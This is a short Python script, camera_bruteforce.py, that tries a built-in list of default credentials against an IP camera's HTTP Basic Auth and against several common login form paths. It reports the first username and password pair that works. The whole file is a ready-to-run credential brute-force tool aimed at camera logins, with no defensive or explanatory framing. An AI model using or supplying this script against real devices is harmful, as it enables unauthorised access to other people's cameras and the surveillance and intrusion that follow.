#!/usr/bin/env python3
# camera_bruteforce.py
import requests
import socket

COMMON_CREDS = [
    ('admin', 'admin'),
    ('admin', '12345'),
    ('admin', '123456'),
    ('admin', 'password'),
    ('admin', ''),
    ('root', 'root'),
    ('root', '12345'),
    ('service', 'service'),
    ('supervisor', 'supervisor'),
    ('888888', '888888'),
    ('666666', '666666')
]

def test_camera_login(ip):
    print(f"[*] Testing camera at {ip}")
    
    # Test HTTP Basic Auth
    for user, passw in COMMON_CREDS:
        try:
            r = requests.get(f'http://{ip}/', auth=(user, passw), timeout=3)
            if r.status_code == 200:
                print(f"[+] HTTP Basic Auth: {user}:{passw}")
                return (user, passw)
        except:
            continue
    
    # Test form login
    login_paths = ['/login.cgi', '/login.php', '/cgi-bin/login.cgi', '/web/login']
    for path in login_paths:
        for user, passw in COMMON_CREDS:
            try:
                data = {'username': user, 'password': passw, 'submit': 'Login'}
                r = requests.post(f'http://{ip}{path}', data=data, timeout=3)
                if 'logout' in r.text.lower() or 'main' in r.text.lower():
                    print(f"[+] Form Login {path}: {user}:{passw}")
                    return (user, passw)
            except:
                continue
    
    return None

if __name__ == "__main__":
    test_camera_login("192.168.1.100")